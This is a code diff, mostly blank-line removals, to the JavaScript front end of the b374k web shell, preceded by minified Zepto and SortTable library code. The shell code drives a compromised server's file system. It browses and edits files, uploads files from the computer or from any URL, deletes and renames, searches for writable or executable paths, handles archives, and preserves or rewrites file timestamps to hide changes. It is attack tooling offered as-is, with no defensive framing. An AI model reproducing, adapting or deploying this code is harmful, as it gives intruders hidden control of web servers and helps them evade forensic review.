$.ajaxSettings)settings[key]===undefined&&(settings[key]=$.ajaxSettings[key]);ajaxStart(settings),settings.crossDomain||(settings.crossDomain=/^([\w-]+:)?\/\/([^\/]+)/.test(settings.url)&&RegExp.$2!=window.location.host),settings.url||(settings.url=window.location.toString()),serializeData(settings),settings.cache===!1&&(settings.url=appendQuery(settings.url,"_="+Date.now()));var dataType=settings.dataType,hasPlaceholder=/=\?/.test(settings.url);if(dataType=="jsonp"||hasPlaceholder)return hasPlaceholder||(settings.url=appendQuery(settings.url,settings.jsonp?settings.jsonp+"=?":settings.jsonp===!1?"":"callback=?")),$.ajaxJSONP(settings,deferred);var mime=settings.accepts[dataType],headers={},setHeader=function(a,b){headers[a.toLowerCase()]=[a,b]},protocol=/^([\w-]+:)\/\//.test(settings.url)?RegExp.$1:window.location.protocol,xhr=settings.xhr(),nativeSetHeader=xhr.setRequestHeader,abortTimeout;deferred&&deferred.promise(xhr),settings.crossDomain||setHeader("X-Requested-With","XMLHttpRequest"),setHeader("Accept",mime||"*/*");if(mime=settings.mimeType||mime)mime.indexOf(",")>-1&&(mime=mime.split(",",2)[0]),xhr.overrideMimeType&&xhr.overrideMimeType(mime);(settings.contentType||settings.contentType!==!1&&settings.data&&settings.type.toUpperCase()!="GET")&&setHeader("Content-Type",settings.contentType||"application/x-www-form-urlencoded");if(settings.headers)for(name in settings.headers)setHeader(name,settings.headers[name]);xhr.setRequestHeader=setHeader,xhr.onreadystatechange=function(){if(xhr.readyState==4){xhr.onreadystatechange=empty,clearTimeout(abortTimeout);var result,error=!1;if(xhr.status>=200&&xhr.status<300||xhr.status==304||xhr.status==0&&protocol=="file:"){dataType=dataType||mimeToDataType(settings.mimeType||xhr.getResponseHeader("content-type")),result=xhr.responseText;try{dataType=="script"?(1,eval)(result):dataType=="xml"?result=xhr.responseXML:dataType=="json"&&(result=blankRE.test(result)?null:$.parseJSON(result))}catch(e){error=e}error?ajaxError(error,"parsererror",xhr,settings,deferred):ajaxSuccess(result,xhr,settings,deferred)}else ajaxError(xhr.statusText||null,xhr.status?"error":"abort",xhr,settings,deferred)}};if(ajaxBeforeSend(xhr,settings)===!1)return xhr.abort(),ajaxError(null,"abort",xhr,settings,deferred),xhr;if(settings.xhrFields)for(name in settings.xhrFields)xhr[name]=settings.xhrFields[name];var async="async"in settings?settings.async:!0;xhr.open(settings.type,settings.url,async,settings.username,settings.password);for(name in headers)nativeSetHeader.apply(xhr,headers[name]);return settings.timeout>0&&(abortTimeout=setTimeout(function(){xhr.onreadystatechange=empty,xhr.abort(),ajaxError(null,"timeout",xhr,settings,deferred)},settings.timeout)),xhr.send(settings.data?settings.data:null),xhr},$.get=function(a,b,c,d){return $.ajax(parseArguments.apply(null,arguments))},$.post=function(a,b,c,d){var e=parseArguments.apply(null,arguments);return e.type="POST",$.ajax(e)},$.getJSON=function(a,b,c){var d=parseArguments.apply(null,arguments);return d.dataType="json",$.ajax(d)},$.fn.load=function(a,b,c){if(!this.length)return this;var d=this,e=a.split(/\s/),f,g=parseArguments(a,b,c),h=g.success;return e.length>1&&(g.url=e[0],f=e[1]),g.success=function(a){d.html(f?$("<div>").html(a.replace(rscript,"")).find(f):a),h&&h.apply(d,arguments)},$.ajax(g),this};var escape=encodeURIComponent;$.param=function(a,b){var c=[];return c.add=function(a,b){this.push(escape(a)+"="+escape(b))},serialize(c,a,b),c.join("&").replace(/%20/g,"+")}}(Zepto),function(a){a.fn.serializeArray=function(){var b=[],c;return a([].slice.call(this.get(0).elements)).each(function(){c=a(this);var d=c.attr("type");this.nodeName.toLowerCase()!="fieldset"&&!this.disabled&&d!="submit"&&d!="reset"&&d!="button"&&(d!="radio"&&d!="checkbox"||this.checked)&&b.push({name:c.attr("name"),value:c.val()})}),b},a.fn.serialize=function(){var a=[];return this.serializeArray().forEach(function(b){a.push(encodeURIComponent(b.name)+"="+encodeURIComponent(b.value))}),a.join("&")},a.fn.submit=function(b){if(b)this.bind("submit",b);else if(this.length){var c=a.Event("submit");this.eq(0).trigger(c),c.isDefaultPrevented()||this.get(0).submit()}return this}}(Zepto),function(a){"__proto__"in{}||a.extend(a.zepto,{Z:function(b,c){return b=b||[],a.extend(b,a.fn),b.selector=c||"",b.__Z=!0,b},isZ:function(b){return a.type(b)==="array"&&"__Z"in b}});try{getComputedStyle(undefined)}catch(b){var c=getComputedStyle;window.getComputedStyle=function(a){try{return c(a)}catch(b){return null}}}}(Zepto)
-
-
 /**
 *
 * SortTable
@@ -2818,7 +2623,6 @@ sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}
 (d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.e,j);if(/WebKit/i.test(navigator.userAgent))var k=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.e()},10);
 window.onload=sorttable.e;var n=1;function p(a){var b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);var c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(var e=0;e<a.length;e++)b.call(c,a[e],e,a)});
 Function.prototype.forEach=function(a,b,c){for(var e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){var c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};
-
 var loading_count = 0;
 var running = false;
 var defaultTab = 'explorer';
@@ -2842,14 +2646,12 @@ var evalReady = false;
 var resizeTimer = '';
 var portableWidth = 700;
 var portableMode = null;
-
 Zepto(function($){
 	if(init_shell){
 		var now = new Date();
 		output("started @ "+ now.toGMTString());
 		output("cwd : "+get_cwd());
 		output("module : "+module_to_load);
-
 		show_tab();
 		xpl_bind();
 		eval_init();
@@ -2862,12 +2664,10 @@ Zepto(function($){
 			clearTimeout(resizeTimer);
 			resizeTimer = setTimeout("window_resize()", 1000);
 		});
-
 		$('.menuitem').on('click', function(e){
 			selectedTab = $(this).attr('href').substr(2);
 			show_tab(selectedTab);
 		});
-
 		$('#logout').on('click', function(e){
 			var cookie = document.cookie.split(';');
 			for(var i=0; i<cookie.length; i++){
@@ -2877,7 +2677,6 @@ Zepto(function($){
 			localStorage.clear();
 			location.href = targeturl;
 		});
-
 		$('#totop').on('click', function(e){
 			$(window).scrollTop(0);
 		});
@@ -2934,7 +2733,6 @@ Zepto(function($){
 		else{
 			info_refresh();
 		}
-
 		if(history.pushState){
 			window.onpopstate = function(event) { refresh_tab(); };
 		}
@@ -2943,11 +2741,9 @@ Zepto(function($){
 		}
 	}
 });
-
 function output(str){
 	console.log('b374k> '+str);
 }
-
 function window_resize(){
 	bodyWidth = $('body').width();
 	if(bodyWidth<=portableWidth){
@@ -2957,13 +2753,11 @@ function window_resize(){
 		layout_normal();
 	}
 }
-
 function layout_portable(){
 	nav = $('#nav');
 	menu = $('#menu');
 	headerNav = $('#headerNav');
 	content = $('#content');
-
 	//nav.hide();
 	nav.prependTo('#content');
 	nav.css('padding','5px 8px');
@@ -2998,12 +2792,10 @@ function layout_portable(){
 	
 	portableMode = true;
 }
-
 function layout_normal(){	
 	nav = $('#nav');
 	menu = $('#menu');	
 	content = $('#content');
-
 	nav.insertAfter('#b374k');
 	nav.css('padding','0');
 	nav.css('margin-top', '0');
@@ -3026,13 +2818,11 @@ function layout_normal(){
 	tblfoot = $('#xplTable tfoot td:last-child');
 	if(tblfoot[0]) tblfoot[0].colSpan = colspan;
 	if(tblfoot[1]) tblfoot[1].colSpan = colspan+1;
-
 	paddingTop = $('#header').height();
 	content.css('padding-top', paddingTop+'px');
 	
 	portableMode = false;
 }
-
 function start_scroll(str){
 	if(str=='top'){
 		to = $(window).scrollTop() - scrollCounter;
@@ -3060,11 +2850,9 @@ function start_scroll(str){
 		}
 	}
 }
-
 function get_cwd(){
 	return decodeURIComponent(get_cookie('cwd'));
 }
-
 function fix_tabchar(el, e){
 	if(e.keyCode==9){
 		e.preventDefault();
@@ -3073,16 +2861,13 @@ function fix_tabchar(el, e){
 		el.selectionEnd = s+1;
 	}
 }
-
 function get_cookie(key){
 	var res;
 	return (res = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (res[1]) : null;
 }
-
 function set_cookie(key, value){
 	document.cookie = key + '=' + encodeURIComponent(value);
 }
-
 function html_safe(str){
 	if(typeof(str) == "string"){
 		str = str.replace(/&/g, "&amp;");
@@ -3093,16 +2878,13 @@ function html_safe(str){
 	}
 	return str;
 }
-
 function ucfirst(str){
 	return str.charAt(0).toUpperCase() + str.slice(1);
 }
-
 function time(){
 	var d = new Date();
 	return d.getTime();
 }
-
 function send_post(targetdata, callback, loading){
 	if(loading==null) loading_start();
 	$.ajax({
@@ -3116,7 +2898,6 @@ function send_post(targetdata, callback, loading){
 		error: function(){ if(loading==null) loading_stop(); }
 	});
 }
-
 function loading_start(){
 	if(!running){
 		$('#overlay').show();
@@ -3124,32 +2905,27 @@ function loading_start(){
 		loading_loop();
 	}
 }
-
 function loading_loop(){
 	if(running){
 		img = $('#loading');
 		img.css('transform', 'rotate('+loading_count+'deg)');
 		img.css('-ms-transform', 'rotate('+loading_count+'deg)');
 		img.css('-webkit-transform', 'rotate('+loading_count+'deg)');
-
 		loading_count+=7;
 		if(loading_count>360) loading_count = 0;
 		if(running) setTimeout("loading_loop()",20);
 	}
 }
-
 function loading_stop(){
 	if(running){
 		img = $('#loading');
 		img.css('transform', 'rotate(0deg)');
 		img.css('-ms-transform', 'rotate(0deg)');
 		img.css('-webkit-transform', 'rotate(0deg)');
-
 		$('#overlay').hide();
 		running = false;
 	}
 }
-
 function show_tab(id){
 	if(!id){
 		if(location.hash!='') id = location.hash.substr(2);
@@ -3157,7 +2933,6 @@ function show_tab(id){
 	}
 	refresh_tab(id);
 }
-
 function refresh_tab(id){
 	if(!id){
 		if(location.hash!='') id = location.hash.substr(2);
@@ -3165,7 +2940,6 @@ function refresh_tab(id){
 	}
 	$('.menuitemSelected').removeClass("menuitemSelected");
 	$('#menu'+id).addClass("menuitemSelected");
-
 	tabScroll[currentTab.attr('id')] = $(window).scrollTop();
 	currentTab.hide();
 	currentTab = $('#'+id);
@@ -3176,25 +2950,20 @@ function refresh_tab(id){
 	}
 	hide_box();
 }
-
 function trap_enter(e, callback){
 	if(e.keyCode==13){
 		if(callback!=null) window[callback]();
 	}
 }
-
 function show_box(title, content){
 	onDrag = false;
 	hide_box();
 	box = "<div class='box'><p class='boxtitle'>"+title+"<span class='boxclose floatRight'>x</span></p><div class='boxcontent'>"+content+"</div><div class='boxresult'></div></div>";
 	$('#content').append(box);
-
 	box_width = $('.box').width();
 	body_width = $('body').width();
-
 	box_height = $('.box').height();
 	body_height = $('body').height();
-
 	x = (body_width - box_width)/2;
 	y = (body_height - box_height)/2;
 	if(x<0 || portableMode) x = 0;
@@ -3203,10 +2972,8 @@ function show_box(title, content){
 		$('.box').css('width', '100%');
 		$('.box').css('height', '100%');	
 	}
-
 	$('.box').css('left', x+'px');
 	$('.box').css('top', y+'px');
-
 	$('.boxclose').on('click', function(e){
 		hide_box();
 	});
@@ -3221,20 +2988,16 @@ function show_box(title, content){
 			else drag_stop();
 		});
 	}
-
 	$(document).off('keyup');
 	$(document).on('keyup', function(e){
 		if(e.keyCode == 27) hide_box();
 	});
-
 	if($('.box input')[0]) $('.box input')[0].focus();
 }
-
 function hide_box(){
 	$(document).off('keyup');
 	$('.box').remove();
 }
-
 function drag_start(){
 	if(!onDrag){
 		onDrag = true;
@@ -3246,7 +3009,6 @@ function drag_start(){
 		setTimeout('drag_loop()',50);
 	}
 }
-
 function drag_loop(){
 	if(onDrag){
 		x = dragX - dragDeltaX;
@@ -3257,12 +3019,10 @@ function drag_loop(){
 		setTimeout('drag_loop()',50);
 	}
 }
-
 function drag_stop(){
 	onDrag = false;
 	$('body').off('mousemove');
 }
-
 function get_all_cbox_selected(id, callback){
 	var buffer = new Array();
 	$('#'+id).find('.cBoxSelected').not('.cBoxAll').each(function(i){
@@ -3272,12 +3032,9 @@ function get_all_cbox_selected(id, callback){
 	});
 	return buffer;
 }
-
-
 function cbox_bind(id, callback){
 	$('#'+id).find('.cBox').off('click');
 	$('#'+id).find('.cBoxAll').off('click');
-
 	$('#'+id).find('.cBox').on('click', function(e){
 		if($(this).hasClass('cBoxSelected')){
 			$(this).removeClass('cBoxSelected');
@@ -3297,8 +3054,6 @@ function cbox_bind(id, callback){
 		if(callback!=null) window[callback]();
 	});
 }
-
-
 function action(path, type){
 	title = "Action";
 	content = '';
@@ -3308,7 +3063,6 @@ function action(path, type){
 	show_box(title, content);
 	xpl_bind();
 }
-
 function navigate(path, showfiles){
 	if(showfiles==null) showfiles = 'true';
 	send_post({ cd:path, showfiles:showfiles }, function(res){
@@ -3328,7 +3082,6 @@ function navigate(path, showfiles){
 		}
 	});
 }
-
 function view(path, type, preserveTimestamp){
 	if(preserveTimestamp==null) preserveTimestamp = 'true';
 	send_post({ viewFile: path, viewType: type, preserveTimestamp:preserveTimestamp }, function(res){
@@ -3351,7 +3104,6 @@ function view(path, type, preserveTimestamp){
 		}
 	});
 }
-
 function view_entry(el){
 	if($(el).attr('data-path')!=''){
 		entry = $(el).attr('data-path');
@@ -3360,13 +3112,11 @@ function view_entry(el){
 		$('#form').html('');
 	}
 }
-
 function ren(path){
 	title = "Rename";
 	content = "<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='" +path+"' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='"+path+"'></td></tr><tr><td colspan='2'><span class='button' onclick='ren_go();'>rename</span></td></tr></table>";
 	show_box(title, content);
 }
-
 function ren_go(){
 	renameFile = $('.renameFile').val();
 	renameFileTo = $('.renameFileTo').val();
@@ -3379,14 +3129,12 @@ function ren_go(){
 		else $('.boxresult').html('Operation(s) failed');
 	});
 }
-
 function newfolder(path){
 	title = "New Folder";
 	path = path + 'newfolder-' + time();
 	content = "<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='"+path+"' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfolder_go();'>create</span></td></tr></table>";
 	show_box(title, content);
 }
-
 function newfolder_go(){
 	newFolder = $('.newFolder').val();
 	send_post({newFolder:newFolder}, function(res){
@@ -3397,14 +3145,12 @@ function newfolder_go(){
 		else $('.boxresult').html('Operation(s) failed');
 	});
 }
-
 function newfile(path){
 	title = "New File";
 	path = path + 'newfile-' + time();
 	content = "<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='"+path+"' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfile_go();'>create</span></td></tr></table>";
 	show_box(title, content);
 }
-
 function newfile_go(){
 	newFile = $('.newFile').val();
 	send_post({newFile:newFile}, function(res){
@@ -3415,13 +3161,11 @@ function newfile_go(){
 		else $('.boxresult').html('Operation(s) failed');
 	});
 }
-
 function viewfileorfolder(){
 	title = "View File / Folder";
 	content = "<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";
 	show_box(title, content);
 }
-
 function viewfileorfolder_go(){
 	entry = $('.viewFileorFolder').val();
 	send_post({viewFileorFolder:entry}, function(res){
@@ -3437,13 +3181,11 @@ function viewfileorfolder_go(){
 		}
 	});
 }
-
 function del(path){
 	title = "Delete";
 	content = "<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='"+path+"' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='delete_go();'>delete</span></td></tr></table>";
 	show_box(title, content);
 }
-
 function delete_go(){
 	path = $('.delete').val();
 	send_post({delete:path}, function(res){
@@ -3454,38 +3196,30 @@ function delete_go(){
 		else $('.boxresult').html('Operation(s) failed');
 	});
 }
-
 function find(path){
 	findfile = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";
 	findfolder = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";
 	$('#explorer').html("<div id='xplUpload'>" +findfile+'<br>'+findfolder+'</div>');
 	cbox_bind('xplUpload');
 }
-
 function find_go_file(){
 	find_go('file');
 }
-
 function find_go_folder(){
 	find_go('folder');
 }
-
 function find_go(findType){
 	findPath = (findType=='file')? $('.findfilePath').val():$('.findFolderPath').val();
 	findResult = (findType=='file')? $('.findfileResult'):$('.findResult');
-
 	findName = (findType=='file')? $('.findfileFilename').val():$('.findFoldername').val();
 	findNameRegex = (findType=='file')? $('.findfileFilenameRegex').hasClass('cBoxSelected').toString():$('.findFoldernameRegex').hasClass('cBoxSelected').toString();
 	findNameInsensitive = (findType=='file')? $('.findfileFilenameInsensitive').hasClass('cBoxSelected').toString():$('.findFoldernameInsensitive').hasClass('cBoxSelected').toString();
-
 	findContent = (findType=='file')? $('.findfileContains').val():"";
 	findContentRegex = (findType=='file')? $('.findfileContainsRegex').hasClass('cBoxSelected').toString():"";
 	findContentInsensitive = (findType=='file')? $('.findfileContainsInsensitive').hasClass('cBoxSelected').toString():"";
-
 	findReadable = (findType=='file')? $('.findfileReadable').hasClass('cBoxSelected').toString():$('.findWritable').hasClass('cBoxSelected').toString();
 	findWritable = (findType=='file')? $('.findfileWritable').hasClass('cBoxSelected').toString():$('.findReadable').hasClass('cBoxSelected').toString();
 	findExecutable = (findType=='file')? $('.findfileExecutable').hasClass('cBoxSelected').toString():$('.findExecutable').hasClass('cBoxSelected').toString();
-
 	send_post(
 		{
 			findType:findType,
@@ -3507,15 +3241,12 @@ function find_go(findType){
 		}
 	);
 }
-
 function ul_go_comp(){
 	ul_go('comp');
 }
-
 function ul_go_url(){
 	ul_go('url');
 }
-
 function ul(path){
 	ulcomputer = "<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_comp();\">upload</span></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";
 	ulurl = "<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_url();\">upload</span></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";
@@ -3523,21 +3254,17 @@ function ul(path){
 	$('#explorer').html(content);
 	ul_add_comp();
 	ul_add_url();
-
 	$('#ulDragNDrop').on('dragenter', function(e){
 		e.stopPropagation();
 		e.preventDefault();
 	});
-
 	$('#ulDragNDrop').on('dragover', function(e){
 		e.stopPropagation();
 		e.preventDefault();
 	});
-
 	$('#ulDragNDrop').on('drop', function(e){
 		e.stopPropagation();
 		e.preventDefault();
-
 		files = e.target.files || e.dataTransfer.files;
 		ulResult = $('.ulDragNDropResult');
 		ulResult.html('');
@@ -3545,16 +3272,13 @@ function ul(path){
 			if(this){
 				ulType = 'DragNDrop';
 				filename = this.name;
-
 				var formData = new FormData();
 				formData.append('ulFile', this);
 				formData.append('ulSaveTo', get_cwd());
 				formData.append('ulFilename', filename);
 				formData.append('ulType', 'comp');
-
 				entry = "<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";
 				ulResult.append(entry);
-
 				if(this.size<=0){
 					$('.ulProgress'+ulType+i).html('( failed )');
 					$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
@@ -3567,17 +3291,14 @@ function ul(path){
 		});
 	});
 }
-
 function ul_add_comp(path){
 	path = html_safe($('.ul_path').val());
 	$('.ulcompadd').append("<tr><td style='width:144px'>File</td><td><input type='file' class='ulFileComp'></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToComp' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameComp' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr>");
 }
-
 function ul_add_url(path){
 	path = html_safe($('.ul_path').val());
 	$('.ulurladd').append("<tr><td style='width:144px'>File URL</td><td><input type='text' class='ulFileUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToUrl' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr>");
 }
-
 function ul_start(formData, ulType, i){
 	loading_start();
 	$.ajax({
@@ -3601,7 +3322,6 @@ function ul_start(formData, ulType, i){
 			if(res.match(/Warning.*POST.*Content-Length.*of.*bytes.*exceeds.*the.*limit.*of/)){
 				res = 'error';
 			}
-
 			if(res=='error'){
 				$('.ulProgress'+ulType+i).html('( failed )');
 			}
@@ -3618,35 +3338,28 @@ function ul_start(formData, ulType, i){
 		}
 	});
 }
-
 function ul_go(ulType){
 	ulFile = (ulType=='comp')? $('.ulFileComp'):$('.ulFileUrl');
 	ulResult = (ulType=='comp')? $('.ulCompResult'):$('.ulUrlResult');
 	ulResult.html('');
-
 	ulFile.each(function(i){
 		if(((ulType=='comp')&&this.files[0])||((ulType=='url')&&(this.value!=''))){
 			file = (ulType=='comp')? this.files[0]: this.value;
 			filename = (ulType=='comp')? file.name: file.substring(file.lastIndexOf('/')+1);
-
 			ulSaveTo = (ulType=='comp')? $('.ulSaveToComp')[i].value:$('.ulSaveToUrl')[i].value;
 			ulFilename = (ulType=='comp')? $('.ulFilenameComp')[i].value:$('.ulFilenameUrl')[i].value;
-
 			var formData = new FormData();
 			formData.append('ulFile', file);
 			formData.append('ulSaveTo', ulSaveTo);
 			formData.append('ulFilename', ulFilename);
 			formData.append('ulType', ulType);
-
 			entry = "<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";
 			ulResult.append(entry);
-
 			check = true;
 			if(ulType=='comp'){
 				check = (file.size<=0);
 			}
 			else check = (file=="");
-
 			if(check){
 				$('.ulProgress'+ulType+i).html('( failed )');
 				$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
@@ -3658,22 +3371,18 @@ function ul_go(ulType){
 		}
 	});
 }
-
 function trap_ctrl_enter(el, e, callback){
 	if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
 		if(callback!=null) window[callback]();
 	}
 	fix_tabchar(el, e);
 }
-
 function edit_save_raw(){
 	edit_save('edit');
 }
-
 function edit_save_hex(){
 	edit_save('hex');
 }
-
 function edit_save(editType){
 	editFilename = $('#editFilename').val();
 	editInput = $('#editInput').val();
@@ -3690,12 +3399,8 @@ function edit_save(editType){
 		}
 	);
 }
-
-
-
 function mass_act(type){
 	buffer = get_all_cbox_selected('xplTable', 'xpl_href');
-
 	if((type=='cut')||(type=='copy')){
 		localStorage.setItem('bufferLength', buffer.length);
 		localStorage.setItem('bufferAction', type);
@@ -3714,20 +3419,16 @@ function mass_act(type){
 				}
 			}
 			massBuffer = $.trim(massBuffer);
-
 			if(bufferAction=='cut') title = 'move';
 			else if(bufferAction=='copy') title = 'copy';
-
 			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
-
 	}
 	else if((type=='extract (tar)')||(type=='extract (tar.gz)')||(type=='extract (zip)')){
 		if(type=='extract (tar)') arcType = 'untar';
 		else if(type=='extract (tar.gz)') arcType = 'untargz';
 		else if(type=='extract (zip)') arcType = 'unzip';
-
 		if(buffer.length>0){
 			massBuffer = '';
 			$.each(buffer,function(i,v){
@@ -3735,7 +3436,6 @@ function mass_act(type){
 			});
 			massBuffer = $.trim(massBuffer);
 			title = type;
-
 			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='"+html_safe(get_cwd())+"'  onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">extract</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
@@ -3755,7 +3455,6 @@ function mass_act(type){
 			arcType = 'zip';
 			arcFilename = rand+'.zip';
 		}
-
 		if(buffer.length>0){
 			massBuffer = '';
 			$.each(buffer,function(i,v){
@@ -3763,7 +3462,6 @@ function mass_act(type){
 			});
 			massBuffer = $.trim(massBuffer);
 			title = type;
-
 			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">compress</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
@@ -3783,56 +3481,43 @@ function mass_act(type){
 				var now = new Date();
 				line = "<tr><td class='colFit'>touch</td><td><input class='massValue' type='text' value='"+now.toGMTString()+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
 			}
-
